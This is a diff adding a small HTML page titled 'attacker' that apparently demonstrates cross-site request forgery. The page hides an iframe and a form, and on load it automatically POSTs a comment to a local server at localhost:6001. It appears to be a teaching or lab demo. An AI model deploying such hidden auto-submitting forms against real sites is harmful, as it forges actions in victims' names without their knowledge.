@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>攻击者</title>
+    <style>
+        iframe,form{
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <iframe id="iframe" name="csrf"></iframe>
+    <form class="wrapper" action="http://localhost:6001/comments" target="csrf" method="POST">
+        <textarea name="msg" placeholder="..."></textarea><br />
+        <button id="btn" type="submit">提交</button>
+    </form>
+
+
+    <script>
+
+        window.onload = function(){
+            document.querySelector("textarea").value = "Yes！！";
+            document.querySelector('.wrapper').submit();
+        };
+
+    </script>
+
+</body>
+</html>
